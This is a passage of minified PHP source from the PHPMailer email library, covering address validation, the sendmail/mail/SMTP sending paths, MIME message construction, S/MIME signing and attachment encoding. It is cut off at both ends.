]+)?)(\((?>(?2)'.'(?>[\x01-\x08\x0B\x0C\x0E-\'*-\[\]-\x7F]|\\\[\x00-\x7F]|(?3)))*(?2)\)))+(?2))|(?2))?)'.'([!#-\'*+\/-9=?^-~-]+|"(?>(?2)(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\x7F]))*'.'(?2)")(?>(?1)\.(?1)(?4))*(?1)@(?!(?1)[a-z0-9-]{64,})(?1)(?>([a-z0-9](?>[a-z0-9-]*[a-z0-9])?)'.'(?>(?1)\.(?!(?1)[a-z0-9-]{64,})(?1)(?5)){0,126}|\[(?:(?>IPv6:(?>([a-f0-9]{1,4})(?>:(?6)){7}'.'|(?!(?:.*[a-f0-9][:\]]){8,})((?6)(?>:(?6)){0,6})?::(?7)?))|(?>(?>IPv6:(?>(?6)(?>:(?6)){5}:'.'|(?!(?:.*[a-f0-9]:){6,})(?8)?::(?>((?6)(?>:(?6)){0,4}):)?))?(25[0-5]|2[0-4][0-9]|1[0-9]{2}'.'|[1-9]?[0-9])(?>\.(?9)){3}))\])(?1)$/isD',$address);case 'pcre':return (boolean)preg_match('/^(?!(?>"?(?>\\\[ -~]|[^"])"?){255,})(?!(?>"?(?>\\\[ -~]|[^"])"?){65,}@)(?>'.'[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*")'.'(?>\.(?>[!#-\'*+\/-9=?^-~-]+|"(?>(?>[\x01-\x08\x0B\x0C\x0E-!#-\[\]-\x7F]|\\\[\x00-\xFF]))*"))*'.'@(?>(?![a-z0-9-]{64,})(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)(?>\.(?![a-z0-9-]{64,})'.'(?>[a-z0-9](?>[a-z0-9-]*[a-z0-9])?)){0,126}|\[(?:(?>IPv6:(?>(?>[a-f0-9]{1,4})(?>:'.'[a-f0-9]{1,4}){7}|(?!(?:.*[a-f0-9][:\]]){8,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?'.'::(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,6})?))|(?>(?>IPv6:(?>[a-f0-9]{1,4}(?>:'.'[a-f0-9]{1,4}){5}:|(?!(?:.*[a-f0-9]:){6,})(?>[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4})?'.'::(?>(?:[a-f0-9]{1,4}(?>:[a-f0-9]{1,4}){0,4}):)?))?(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}'.'|[1-9]?[0-9])(?>\.(?>25[0-5]|2[0-4][0-9]|1[0-9]{2}|[1-9]?[0-9])){3}))\])$/isD',$address);case 'html5':return (boolean)preg_match('/^[a-zA-Z0-9.!#$%&\'*+\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}'.'[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/sD',$address);case 'noregex':return (strlen($address)>=3 and strpos($address,'@')>=1 and strpos($address,'@')!=strlen($address)-1);case 'php':default:return (boolean)filter_var($address,FILTER_VALIDATE_EMAIL);}} public function idnSupported(){return function_exists('idn_to_ascii') and function_exists('mb_convert_encoding');} public function punyencodeAddress($address){if($this->idnSupported() and !empty($this->CharSet) and ($pos=strrpos($address,'@'))!==false){$domain=substr($address,++$pos);if($this->has8bitChars($domain) and @mb_check_encoding($domain,$this->CharSet)){$domain=mb_convert_encoding($domain,'UTF-8',$this->CharSet);if(($punycode=defined('INTL_IDNA_VARIANT_UTS46')?idn_to_ascii($domain,0,INTL_IDNA_VARIANT_UTS46):idn_to_ascii($domain))!==false){return substr($address,0,$pos).$punycode;}}}return $address;} public function send(){try{if(!$this->preSend()){return false;}return $this->postSend();}catch(phpmailerException$exc){$this->mailHeader='';$this->setError($exc->getMessage());if($this->exceptions){ throw $exc;}return false;}} public function preSend(){try{$this->error_count=0;$this->mailHeader='';foreach(array_merge($this->RecipientsQueue,$this->ReplyToQueue) as $params){$params[1]=$this->punyencodeAddress($params[1]);call_user_func_array(array($this,'addAnAddress'),$params);}if((count($this->to)+count($this->cc)+count($this->bcc))<1){ throw new phpmailerException($this->lang('provide_address'),self::STOP_CRITICAL);}foreach(array('From','Sender','ConfirmReadingTo') as $address_kind){$this->$address_kind=trim($this->$address_kind);if(empty($this->$address_kind)){continue;}$this->$address_kind=$this->punyencodeAddress($this->$address_kind);if(!$this->validateAddress($this->$address_kind)){$error_message=$this->lang('invalid_address').' (punyEncode) '.$this->$address_kind;$this->setError($error_message);$this->edebug($error_message);if($this->exceptions){ throw new phpmailerException($error_message);}return false;}}if($this->alternativeExists()){$this->ContentType='multipart/alternative';}$this->setMessageType();if(!$this->AllowEmpty and empty($this->Body)){ throw new phpmailerException($this->lang('empty_message'),self::STOP_CRITICAL);}$this->MIMEHeader='';$this->MIMEBody=$this->createBody();$tempheaders=$this->MIMEHeader;$this->MIMEHeader=$this->createHeader();$this->MIMEHeader.=$tempheaders;if($this->Mailer=='mail'){if(count($this->to)>0){$this->mailHeader.=$this->addrAppend('To',$this->to);}else {$this->mailHeader.=$this->headerLine('To','undisclosed-recipients:;');}$this->mailHeader.=$this->headerLine('Subject',$this->encodeHeader($this->secureHeader(trim($this->Subject))));}if(!empty($this->DKIM_domain)&&!empty($this->DKIM_selector)&&(!empty($this->DKIM_private_string)||(!empty($this->DKIM_private)&&file_exists($this->DKIM_private)))){$header_dkim=$this->DKIM_Add($this->MIMEHeader.$this->mailHeader,$this->encodeHeader($this->secureHeader($this->Subject)),$this->MIMEBody);$this->MIMEHeader=rtrim($this->MIMEHeader,"\r\n ").self::CRLF.str_replace("\r\n","\n",$header_dkim).self::CRLF;}return true;}catch(phpmailerException$exc){$this->setError($exc->getMessage());if($this->exceptions){ throw $exc;}return false;}} public function postSend(){try{switch($this->Mailer){case 'sendmail':case 'qmail':return $this->sendmailSend($this->MIMEHeader,$this->MIMEBody);case 'smtp':return $this->smtpSend($this->MIMEHeader,$this->MIMEBody);case 'mail':return $this->mailSend($this->MIMEHeader,$this->MIMEBody);default:$sendMethod=$this->Mailer.'Send';if(method_exists($this,$sendMethod)){return $this->$sendMethod($this->MIMEHeader,$this->MIMEBody);}return $this->mailSend($this->MIMEHeader,$this->MIMEBody);}}catch(phpmailerException$exc){$this->setError($exc->getMessage());$this->edebug($exc->getMessage());if($this->exceptions){ throw $exc;}}return false;} protected function sendmailSend($header,$body){if(!empty($this->Sender) and self::isShellSafe($this->Sender)){if($this->Mailer=='qmail'){$sendmailFmt='%s -f%s';}else {$sendmailFmt='%s -oi -f%s -t';}}else {if($this->Mailer=='qmail'){$sendmailFmt='%s';}else {$sendmailFmt='%s -oi -t';}}$sendmail=sprintf($sendmailFmt,escapeshellcmd($this->Sendmail),$this->Sender);if($this->SingleTo){foreach($this->SingleToArray as $toAddr){if(!@$mail=popen($sendmail,'w')){ throw new phpmailerException($this->lang('execute').$this->Sendmail,self::STOP_CRITICAL);}fputs($mail,'To: '.$toAddr."\n");fputs($mail,$header);fputs($mail,$body);$result=pclose($mail);$this->doCallback(($result==0),array($toAddr),$this->cc,$this->bcc,$this->Subject,$body,$this->From);if($result!=0){ throw new phpmailerException($this->lang('execute').$this->Sendmail,self::STOP_CRITICAL);}}}else {if(!@$mail=popen($sendmail,'w')){ throw new phpmailerException($this->lang('execute').$this->Sendmail,self::STOP_CRITICAL);}fputs($mail,$header);fputs($mail,$body);$result=pclose($mail);$this->doCallback(($result==0),$this->to,$this->cc,$this->bcc,$this->Subject,$body,$this->From);if($result!=0){ throw new phpmailerException($this->lang('execute').$this->Sendmail,self::STOP_CRITICAL);}}return true;} protected static function isShellSafe($string){if(escapeshellcmd($string)!==$string or !in_array(escapeshellarg($string),array("'$string'","\"$string\""))){return false;}$length=strlen($string);for($i=0;$i<$length;$i++){$c=$string[$i];if(!ctype_alnum($c)&&strpos('@_-.',$c)===false){return false;}}return true;} protected function mailSend($header,$body){$toArr=array();foreach($this->to as $toaddr){$toArr[]=$this->addrFormat($toaddr);}$to=implode(', ',$toArr);$params=null;if(!empty($this->Sender) and $this->validateAddress($this->Sender)){if(self::isShellSafe($this->Sender)){$params=sprintf('-f%s',$this->Sender);}}if(!empty($this->Sender) and !ini_get('safe_mode') and $this->validateAddress($this->Sender)){$old_from=ini_get('sendmail_from');ini_set('sendmail_from',$this->Sender);}$result=false;if($this->SingleTo and count($toArr)>1){foreach($toArr as $toAddr){$result=$this->mailPassthru($toAddr,$this->Subject,$body,$header,$params);$this->doCallback($result,array($toAddr),$this->cc,$this->bcc,$this->Subject,$body,$this->From);}}else {$result=$this->mailPassthru($to,$this->Subject,$body,$header,$params);$this->doCallback($result,$this->to,$this->cc,$this->bcc,$this->Subject,$body,$this->From);}if(isset($old_from)){ini_set('sendmail_from',$old_from);}if(!$result){ throw new phpmailerException($this->lang('instantiate'),self::STOP_CRITICAL);}return true;} public function getSMTPInstance(){if(!is_object($this->smtp)){$this->smtp=new SMTP;}return $this->smtp;} protected function smtpSend($header,$body){$bad_rcpt=array();if(!$this->smtpConnect($this->SMTPOptions)){ throw new phpmailerException($this->lang('smtp_connect_failed'),self::STOP_CRITICAL);}if(!empty($this->Sender) and $this->validateAddress($this->Sender)){$smtp_from=$this->Sender;}else {$smtp_from=$this->From;}if(!$this->smtp->mail($smtp_from)){$this->setError($this->lang('from_failed').$smtp_from.' : '.implode(',',$this->smtp->getError())); throw new phpmailerException($this->ErrorInfo,self::STOP_CRITICAL);}foreach(array($this->to,$this->cc,$this->bcc) as $togroup){foreach($togroup as $to){if(!$this->smtp->recipient($to[0])){$error=$this->smtp->getError();$bad_rcpt[]=array('to'=>$to[0],'error'=>$error['detail']);$isSent=false;}else {$isSent=true;}$this->doCallback($isSent,array($to[0]),array(),array(),$this->Subject,$body,$this->From);}}if((count($this->all_recipients)>count($bad_rcpt)) and !$this->smtp->data($header.$body)){ throw new phpmailerException($this->lang('data_not_accepted'),self::STOP_CRITICAL);}if($this->SMTPKeepAlive){$this->smtp->reset();}else {$this->smtp->quit();$this->smtp->close();}if(count($bad_rcpt)>0){$errstr='';foreach($bad_rcpt as $bad){$errstr.=$bad['to'].': '.$bad['error'];} throw new phpmailerException($this->lang('recipients_failed').$errstr,self::STOP_CONTINUE);}return true;} public function smtpConnect($options=null){if(is_null($this->smtp)){$this->smtp=$this->getSMTPInstance();}if(is_null($options)){$options=$this->SMTPOptions;}if($this->smtp->connected()){return true;}$this->smtp->setTimeout($this->Timeout);$this->smtp->setDebugLevel($this->SMTPDebug);$this->smtp->setDebugOutput($this->Debugoutput);$this->smtp->setVerp($this->do_verp);$hosts=explode(';',$this->Host);$lastexception=null;foreach($hosts as $hostentry){$hostinfo=array();if(!preg_match('/^((ssl|tls):\/\/)*([a-zA-Z0-9\.-]*):?([0-9]*)$/',trim($hostentry),$hostinfo)){continue;}$prefix='';$secure=$this->SMTPSecure;$tls=($this->SMTPSecure=='tls');if('ssl'==$hostinfo[2] or (''==$hostinfo[2] and 'ssl'==$this->SMTPSecure)){$prefix='ssl://';$tls=false;$secure='ssl';}elseif($hostinfo[2]=='tls'){$tls=true;$secure='tls';}$sslext=defined('OPENSSL_ALGO_SHA1');if('tls'===$secure or 'ssl'===$secure){if(!$sslext){ throw new phpmailerException($this->lang('extension_missing').'openssl',self::STOP_CRITICAL);}}$host=$hostinfo[3];$port=$this->Port;$tport=(integer)$hostinfo[4];if($tport>0 and $tport<65536){$port=$tport;}if($this->smtp->connect($prefix.$host,$port,$this->Timeout,$options)){try{if($this->Helo){$hello=$this->Helo;}else {$hello=$this->serverHostname();}$this->smtp->hello($hello);if($this->SMTPAutoTLS and $sslext and $secure!='ssl' and $this->smtp->getServerExt('STARTTLS')){$tls=true;}if($tls){if(!$this->smtp->startTLS()){ throw new phpmailerException($this->lang('connect_host'));}$this->smtp->hello($hello);}if($this->SMTPAuth){if(!$this->smtp->authenticate($this->Username,$this->Password,$this->AuthType,$this->Realm,$this->Workstation)){ throw new phpmailerException($this->lang('authenticate'));}}return true;}catch(phpmailerException$exc){$lastexception=$exc;$this->edebug($exc->getMessage());$this->smtp->quit();}}}$this->smtp->close();if($this->exceptions and !is_null($lastexception)){ throw $lastexception;}return false;} public function smtpClose(){if(is_a($this->smtp,'SMTP')){if($this->smtp->connected()){$this->smtp->quit();$this->smtp->close();}}} public function setLanguage($langcode='en',$lang_path=''){$renamed_langcodes=array('br'=>'pt_br','cz'=>'cs','dk'=>'da','no'=>'nb','se'=>'sv',);if(isset($renamed_langcodes[$langcode])){$langcode=$renamed_langcodes[$langcode];}$PHPMAILER_LANG=array('authenticate'=>'SMTP Error: Could not authenticate.','connect_host'=>'SMTP Error: Could not connect to SMTP host.','data_not_accepted'=>'SMTP Error: data not accepted.','empty_message'=>'Message body empty','encoding'=>'Unknown encoding: ','execute'=>'Could not execute: ','file_access'=>'Could not access file: ','file_open'=>'File Error: Could not open file: ','from_failed'=>'The following From address failed: ','instantiate'=>'Could not instantiate mail function.','invalid_address'=>'Invalid address: ','mailer_not_supported'=>' mailer is not supported.','provide_address'=>'You must provide at least one recipient email address.','recipients_failed'=>'SMTP Error: The following recipients failed: ','signing'=>'Signing Error: ','smtp_connect_failed'=>'SMTP connect() failed.','smtp_error'=>'SMTP server error: ','variable_set'=>'Cannot set or reset variable: ','extension_missing'=>'Extension missing: ');if(empty($lang_path)){$lang_path=dirname(__FILE__).DIRECTORY_SEPARATOR.'language'.DIRECTORY_SEPARATOR;}if(!preg_match('/^[a-z]{2}(?:_[a-zA-Z]{2})?$/',$langcode)){$langcode='en';}$foundlang=true;$lang_file=$lang_path.'phpmailer.lang-'.$langcode.'.php';if($langcode!='en'){if(!is_readable($lang_file)){$foundlang=false;}else {$foundlang=include $lang_file;}}$this->language=$PHPMAILER_LANG;return (boolean)$foundlang;} public function getTranslations(){return $this->language;} public function addrAppend($type,$addr){$addresses=array();foreach($addr as $address){$addresses[]=$this->addrFormat($address);}return $type.': '.implode(', ',$addresses).$this->LE;} public function addrFormat($addr){if(empty($addr[1])){return $this->secureHeader($addr[0]);}else {return $this->encodeHeader($this->secureHeader($addr[1]),'phrase').' <'.$this->secureHeader($addr[0]).'>';}} public function wrapText($message,$length,$qp_mode=false){if($qp_mode){$soft_break=sprintf(' =%s',$this->LE);}else {$soft_break=$this->LE;}$is_utf8=(strtolower($this->CharSet)=='utf-8');$lelen=strlen($this->LE);$crlflen=strlen(self::CRLF);$message=$this->fixEOL($message);if(substr($message,-$lelen)==$this->LE){$message=substr($message,0,-$lelen);}$lines=explode($this->LE,$message);$message='';foreach($lines as $line){$words=explode(' ',$line);$buf='';$firstword=true;foreach($words as $word){if($qp_mode and (strlen($word)>$length)){$space_left=$length-strlen($buf)-$crlflen;if(!$firstword){if($space_left>20){$len=$space_left;if($is_utf8){$len=$this->utf8CharBoundary($word,$len);}elseif(substr($word,$len-1,1)=='='){$len--;}elseif(substr($word,$len-2,1)=='='){$len-=2;}$part=substr($word,0,$len);$word=substr($word,$len);$buf.=' '.$part;$message.=$buf.sprintf('=%s',self::CRLF);}else {$message.=$buf.$soft_break;}$buf='';}while(strlen($word)>0){if($length<=0){break;}$len=$length;if($is_utf8){$len=$this->utf8CharBoundary($word,$len);}elseif(substr($word,$len-1,1)=='='){$len--;}elseif(substr($word,$len-2,1)=='='){$len-=2;}$part=substr($word,0,$len);$word=substr($word,$len);if(strlen($word)>0){$message.=$part.sprintf('=%s',self::CRLF);}else {$buf=$part;}}}else {$buf_o=$buf;if(!$firstword){$buf.=' ';}$buf.=$word;if(strlen($buf)>$length and $buf_o!=''){$message.=$buf_o.$soft_break;$buf=$word;}}$firstword=false;}$message.=$buf.self::CRLF;}return $message;} public function utf8CharBoundary($encodedText,$maxLength){$foundSplitPos=false;$lookBack=3;while(!$foundSplitPos){$lastChunk=substr($encodedText,$maxLength-$lookBack,$lookBack);$encodedCharPos=strpos($lastChunk,'=');if(false!==$encodedCharPos){$hex=substr($encodedText,$maxLength-$lookBack+$encodedCharPos+1,2);$dec=hexdec($hex);if($dec<128){if($encodedCharPos>0){$maxLength=$maxLength-($lookBack-$encodedCharPos);}$foundSplitPos=true;}elseif($dec>=192){$maxLength=$maxLength-($lookBack-$encodedCharPos);$foundSplitPos=true;}elseif($dec<192){$lookBack+=3;}}else {$foundSplitPos=true;}}return $maxLength;} public function setWordWrap(){if($this->WordWrap<1){return;}switch($this->message_type){case 'alt':case 'alt_inline':case 'alt_attach':case 'alt_inline_attach':$this->AltBody=$this->wrapText($this->AltBody,$this->WordWrap);break;default:$this->Body=$this->wrapText($this->Body,$this->WordWrap);break;}} public function createHeader(){$result='';if($this->MessageDate==''){$this->MessageDate=self::rfcDate();}$result.=$this->headerLine('Date',$this->MessageDate);if($this->SingleTo){if($this->Mailer!='mail'){foreach($this->to as $toaddr){$this->SingleToArray[]=$this->addrFormat($toaddr);}}}else {if(count($this->to)>0){if($this->Mailer!='mail'){$result.=$this->addrAppend('To',$this->to);}}elseif(count($this->cc)==0){$result.=$this->headerLine('To','undisclosed-recipients:;');}}$result.=$this->addrAppend('From',array(array(trim($this->From),$this->FromName)));if(count($this->cc)>0){$result.=$this->addrAppend('Cc',$this->cc);}if(($this->Mailer=='sendmail' or $this->Mailer=='qmail' or $this->Mailer=='mail') and count($this->bcc)>0){$result.=$this->addrAppend('Bcc',$this->bcc);}if(count($this->ReplyTo)>0){$result.=$this->addrAppend('Reply-To',$this->ReplyTo);}if($this->Mailer!='mail'){$result.=$this->headerLine('Subject',$this->encodeHeader($this->secureHeader($this->Subject)));}if(''!=$this->MessageID and preg_match('/^<.*@.*>$/',$this->MessageID)){$this->lastMessageID=$this->MessageID;}else {$this->lastMessageID=sprintf('<%s@%s>',$this->uniqueid,$this->serverHostname());}$result.=$this->headerLine('Message-ID',$this->lastMessageID);if(!is_null($this->Priority)){$result.=$this->headerLine('X-Priority',$this->Priority);}if($this->XMailer==''){$result.=$this->headerLine('X-Mailer','PHPMailer '.$this->Version.' (https://github.com/PHPMailer/PHPMailer)');}else {$myXmailer=trim($this->XMailer);if($myXmailer){$result.=$this->headerLine('X-Mailer',$myXmailer);}}if($this->ConfirmReadingTo!=''){$result.=$this->headerLine('Disposition-Notification-To','<'.$this->ConfirmReadingTo.'>');}foreach($this->CustomHeader as $header){$result.=$this->headerLine(trim($header[0]),$this->encodeHeader(trim($header[1])));}if(!$this->sign_key_file){$result.=$this->headerLine('MIME-Version','1.0');$result.=$this->getMailMIME();}return $result;} public function getMailMIME(){$result='';$ismultipart=true;switch($this->message_type){case 'inline':$result.=$this->headerLine('Content-Type','multipart/related;');$result.=$this->textLine("\tboundary=\"".$this->boundary[1].'"');break;case 'attach':case 'inline_attach':case 'alt_attach':case 'alt_inline_attach':$result.=$this->headerLine('Content-Type','multipart/mixed;');$result.=$this->textLine("\tboundary=\"".$this->boundary[1].'"');break;case 'alt':case 'alt_inline':$result.=$this->headerLine('Content-Type','multipart/alternative;');$result.=$this->textLine("\tboundary=\"".$this->boundary[1].'"');break;default:$result.=$this->textLine('Content-Type: '.$this->ContentType.'; charset='.$this->CharSet);$ismultipart=false;break;}if($this->Encoding!='7bit'){if($ismultipart){if($this->Encoding=='8bit'){$result.=$this->headerLine('Content-Transfer-Encoding','8bit');}}else {$result.=$this->headerLine('Content-Transfer-Encoding',$this->Encoding);}}if($this->Mailer!='mail'){$result.=$this->LE;}return $result;} public function getSentMIMEMessage(){return rtrim($this->MIMEHeader.$this->mailHeader,"\n\r").self::CRLF.self::CRLF.$this->MIMEBody;} protected function generateId(){return md5(uniqid(time()));} public function createBody(){$body='';$this->uniqueid=$this->generateId();$this->boundary[1]='b1_'.$this->uniqueid;$this->boundary[2]='b2_'.$this->uniqueid;$this->boundary[3]='b3_'.$this->uniqueid;if($this->sign_key_file){$body.=$this->getMailMIME().$this->LE;}$this->setWordWrap();$bodyEncoding=$this->Encoding;$bodyCharSet=$this->CharSet;if($bodyEncoding=='8bit' and !$this->has8bitChars($this->Body)){$bodyEncoding='7bit';$bodyCharSet='us-ascii';}if('base64'!=$this->Encoding and self::hasLineLongerThanMax($this->Body)){$bodyEncoding='quoted-printable';}$altBodyEncoding=$this->Encoding;$altBodyCharSet=$this->CharSet;if($altBodyEncoding=='8bit' and !$this->has8bitChars($this->AltBody)){$altBodyEncoding='7bit';$altBodyCharSet='us-ascii';}if('base64'!=$altBodyEncoding and self::hasLineLongerThanMax($this->AltBody)){$altBodyEncoding='quoted-printable';}$mimepre="This is a multi-part message in MIME format.".$this->LE.$this->LE;switch($this->message_type){case 'inline':$body.=$mimepre;$body.=$this->getBoundary($this->boundary[1],$bodyCharSet,'',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->attachAll('inline',$this->boundary[1]);break;case 'attach':$body.=$mimepre;$body.=$this->getBoundary($this->boundary[1],$bodyCharSet,'',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->attachAll('attachment',$this->boundary[1]);break;case 'inline_attach':$body.=$mimepre;$body.=$this->textLine('--'.$this->boundary[1]);$body.=$this->headerLine('Content-Type','multipart/related;');$body.=$this->textLine("\tboundary=\"".$this->boundary[2].'"');$body.=$this->LE;$body.=$this->getBoundary($this->boundary[2],$bodyCharSet,'',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->attachAll('inline',$this->boundary[2]);$body.=$this->LE;$body.=$this->attachAll('attachment',$this->boundary[1]);break;case 'alt':$body.=$mimepre;$body.=$this->getBoundary($this->boundary[1],$altBodyCharSet,'text/plain',$altBodyEncoding);$body.=$this->encodeString($this->AltBody,$altBodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->getBoundary($this->boundary[1],$bodyCharSet,'text/html',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=$this->LE.$this->LE;if(!empty($this->Ical)){$body.=$this->getBoundary($this->boundary[1],'','text/calendar; method=REQUEST','');$body.=$this->encodeString($this->Ical,$this->Encoding);$body.=$this->LE.$this->LE;}$body.=$this->endBoundary($this->boundary[1]);break;case 'alt_inline':$body.=$mimepre;$body.=$this->getBoundary($this->boundary[1],$altBodyCharSet,'text/plain',$altBodyEncoding);$body.=$this->encodeString($this->AltBody,$altBodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->textLine('--'.$this->boundary[1]);$body.=$this->headerLine('Content-Type','multipart/related;');$body.=$this->textLine("\tboundary=\"".$this->boundary[2].'"');$body.=$this->LE;$body.=$this->getBoundary($this->boundary[2],$bodyCharSet,'text/html',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->attachAll('inline',$this->boundary[2]);$body.=$this->LE;$body.=$this->endBoundary($this->boundary[1]);break;case 'alt_attach':$body.=$mimepre;$body.=$this->textLine('--'.$this->boundary[1]);$body.=$this->headerLine('Content-Type','multipart/alternative;');$body.=$this->textLine("\tboundary=\"".$this->boundary[2].'"');$body.=$this->LE;$body.=$this->getBoundary($this->boundary[2],$altBodyCharSet,'text/plain',$altBodyEncoding);$body.=$this->encodeString($this->AltBody,$altBodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->getBoundary($this->boundary[2],$bodyCharSet,'text/html',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->endBoundary($this->boundary[2]);$body.=$this->LE;$body.=$this->attachAll('attachment',$this->boundary[1]);break;case 'alt_inline_attach':$body.=$mimepre;$body.=$this->textLine('--'.$this->boundary[1]);$body.=$this->headerLine('Content-Type','multipart/alternative;');$body.=$this->textLine("\tboundary=\"".$this->boundary[2].'"');$body.=$this->LE;$body.=$this->getBoundary($this->boundary[2],$altBodyCharSet,'text/plain',$altBodyEncoding);$body.=$this->encodeString($this->AltBody,$altBodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->textLine('--'.$this->boundary[2]);$body.=$this->headerLine('Content-Type','multipart/related;');$body.=$this->textLine("\tboundary=\"".$this->boundary[3].'"');$body.=$this->LE;$body.=$this->getBoundary($this->boundary[3],$bodyCharSet,'text/html',$bodyEncoding);$body.=$this->encodeString($this->Body,$bodyEncoding);$body.=$this->LE.$this->LE;$body.=$this->attachAll('inline',$this->boundary[3]);$body.=$this->LE;$body.=$this->endBoundary($this->boundary[2]);$body.=$this->LE;$body.=$this->attachAll('attachment',$this->boundary[1]);break;default:$this->Encoding=$bodyEncoding;$body.=$this->encodeString($this->Body,$this->Encoding);break;}if($this->isError()){$body='';}elseif($this->sign_key_file){try{if(!defined('PKCS7_TEXT')){ throw new phpmailerException($this->lang('extension_missing').'openssl');}$file=tempnam(sys_get_temp_dir(),'mail');if(false===file_put_contents($file,$body)){ throw new phpmailerException($this->lang('signing').' Could not write temp file');}$signed=tempnam(sys_get_temp_dir(),'signed');if(empty($this->sign_extracerts_file)){$sign=@openssl_pkcs7_sign($file,$signed,'file://'.realpath($this->sign_cert_file),array('file://'.realpath($this->sign_key_file),$this->sign_key_pass),null);}else {$sign=@openssl_pkcs7_sign($file,$signed,'file://'.realpath($this->sign_cert_file),array('file://'.realpath($this->sign_key_file),$this->sign_key_pass),null,PKCS7_DETACHED,$this->sign_extracerts_file);}if($sign){@unlink($file);$body=file_get_contents($signed);@unlink($signed);$parts=explode("\n\n",$body,2);$this->MIMEHeader.=$parts[0].$this->LE.$this->LE;$body=$parts[1];}else {@unlink($file);@unlink($signed); throw new phpmailerException($this->lang('signing').openssl_error_string());}}catch(phpmailerException$exc){$body='';if($this->exceptions){ throw $exc;}}}return $body;} protected function getBoundary($boundary,$charSet,$contentType,$encoding){$result='';if($charSet==''){$charSet=$this->CharSet;}if($contentType==''){$contentType=$this->ContentType;}if($encoding==''){$encoding=$this->Encoding;}$result.=$this->textLine('--'.$boundary);$result.=sprintf('Content-Type: %s; charset=%s',$contentType,$charSet);$result.=$this->LE;if($encoding!='7bit'){$result.=$this->headerLine('Content-Transfer-Encoding',$encoding);}$result.=$this->LE;return $result;} protected function endBoundary($boundary){return $this->LE.'--'.$boundary.'--'.$this->LE;} protected function setMessageType(){$type=array();if($this->alternativeExists()){$type[]='alt';}if($this->inlineImageExists()){$type[]='inline';}if($this->attachmentExists()){$type[]='attach';}$this->message_type=implode('_',$type);if($this->message_type==''){$this->message_type='plain';}} public function headerLine($name,$value){return $name.': '.$value.$this->LE;} public function textLine($value){return $value.$this->LE;} public function addAttachment($path,$name='',$encoding='base64',$type='',$disposition='attachment'){try{if(!@is_file($path)){ throw new phpmailerException($this->lang('file_access').$path,self::STOP_CONTINUE);}if($type==''){$type=self::filenameToType($path);}$filename=basename($path);if($name==''){$name=$filename;}$this->attachment[]=array(0=>$path,1=>$filename,2=>$name,3=>$encoding,4=>$type,5=>false,6=>$disposition,7=>0);}catch(phpmailerException$exc){$this->setError($exc->getMessage());$this->edebug($exc->getMessage());if($this->exceptions){ throw $exc;}return false;}return true;} public function getAttachments(){return $this->attachment;} protected function attachAll($disposition_type,$boundary){$mime=array();$cidUniq=array();$incl=array();foreach($this->attachment as $attachment){if($attachment[6]==$disposition_type){$string='';$path='';$bString=$attachment[5];if($bString){$string=$attachment[0];}else {$path=$attachment[0];}$inclhash=md5(serialize($attachment));if(in_array($inclhash,$incl)){continue;}$incl[]=$inclhash;$name=$attachment[2];$encoding=$attachment[3];$type=$attachment[4];$disposition=$attachment[6];$cid=$attachment[7];if($disposition=='inline'&&array_key_exists($cid,$cidUniq)){continue;}$cidUniq[$cid]=true;$mime[]=sprintf('--%s%s',$boundary,$this->LE);if(!empty($name)){$mime[]=sprintf('Content-Type: %s; name="%s"%s',$type,$this->encodeHeader($this->secureHeader($name)),$this->LE);}else {$mime[]=sprintf('Content-Type: %s%s',$type,$this->LE);}if($encoding!='7bit'){$mime[]=sprintf('Content-Transfer-Encoding: %s%s',$encoding,$this->LE);}if($disposition=='inline'){$mime[]=sprintf('Content-ID: <%s>%s',$cid,$this->LE);}if(!(empty($disposition))){$encoded_name=$this->encodeHeader($this->secureHeader($name));if(preg_match('/[ \(\)<>@,;:\\"\/\[\]\?=]/',$encoded_name)){$mime[]=sprintf('Content-Disposition: %s; filename="%s"%s',$disposition,$encoded_name,$this->LE.$this->LE);}else {if(!empty($encoded_name)){$mime[]=sprintf('Content-Disposition: %s; filename=%s%s',$disposition,$encoded_name,$this->LE.$this->LE);}else {$mime[]=sprintf('Content-Disposition: %s%s',$disposition,$this->LE.$this->LE);}}}else {$mime[]=$this->LE;}if($bString){$mime[]=$this->encodeString($string,$encoding);if($this->isError()){return '';}$mime[]=$this->LE.$this->LE;}else {$mime[]=$this->encodeFile($path,$encoding);if($this->isError()){return '';}$mime[]=$this->LE.$this->LE;}}}$mime[]=sprintf('--%s--%s',$boundary,$this->LE);return implode('',$mime);} protected function encodeFile($path,$encoding='base64'){try{if(!is_readable($path)){ throw new phpmailerException($this->lang('file_open').$path,self::STOP_CONTINUE);}$magic_quotes=get_magic_quotes_runtime();if($magic_quotes){if(version_compare(PHP_VERSION,'5.3.0','<')){set_magic_quotes_runtime(false);}else {ini_set('magic_quotes_runtime',false);}}$file_buffer=file_get_contents($path);$file_buffer=$this->encodeString($file_buffer,$encoding);if($magic_quotes){if(version_compare(PHP_VERSION,'5.3.0','<')){set_magic_quotes_runtime($magic_quotes);}else {ini_set('magic_quotes_runtime',$magic_quotes);}}return $file_buffer;}catch(Exception$exc){$this->setError($exc->getMessage());return '';}} public function encodeString($str,$encoding='base64'){$encoded='';switch(strtolower($encoding)){case 